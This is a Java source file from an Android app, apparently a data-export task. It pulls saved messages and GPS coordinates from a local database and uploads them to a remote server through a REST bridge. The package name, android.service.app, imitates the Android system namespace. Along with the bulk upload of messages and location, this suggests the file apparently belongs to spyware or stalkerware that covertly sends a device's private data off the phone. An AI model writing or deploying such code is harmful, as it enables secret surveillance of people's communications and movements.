package android.service.app.task.impl;

import android.content.Context;
import android.service.app.db.sqllite.impl.SqlLiteDatabaseHelper;
import android.service.app.db.data.GenericGps;
import android.service.app.db.data.GenericMessage;
import android.service.app.db.data.GenericDevice;
import android.service.app.db.data.GenericAccount;
import android.service.app.task.CallbackHandler;
import android.service.app.task.GenericDataTask;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.Log;

import java.util.Set;

public class ExportDataTask<Input> extends GenericDataTask<Input>
{

    public ExportDataTask(SqlLiteDatabaseHelper localDatabase, Context context, CallbackHandler<SyncOutput> handler)
    {
        super(localDatabase, context, handler);
    }

    @SafeVarargs
    protected final SyncOutput doInBackground(Input... voids)
    {
        try
        {
            GenericAccount account = accounts().getFirst();
            if (Log.isInfoEnabled()) Log.info("account: " + account);
            if (account.isEmpty()) return buildSyncOutput(EMPTY_ACCOUNT);

            GenericDevice device = devices().getFirst();
            if (Log.isInfoEnabled()) Log.info("device: " + device);
            if (device.isEmpty()) return buildSyncOutput(EMPTY_DEVICE);

            Set<GenericMessage> actualMessagesBySync = messages().getActualBySync();
            Set<GenericGps> actualCoordinatesBySync = coordinates().getActualBySync();

            if (Log.isInfoEnabled()) Log.info("actualMessagesBySync: " + actualMessagesBySync);
            if (!actualMessagesBySync.isEmpty()) restBridge.postMessages(actualMessagesBySync);

            if (Log.isInfoEnabled()) Log.info("actualCoordinatesBySync: " + actualCoordinatesBySync);
            if (!actualCoordinatesBySync.isEmpty()) restBridge.postGps(actualCoordinatesBySync);
        } catch (Exception e)
        {
            AndroidUtils.handleExceptionWithoutThrow(e);
            return new SyncOutput(e);
        }

        return buildSuccessSyncOutput();
    }
}
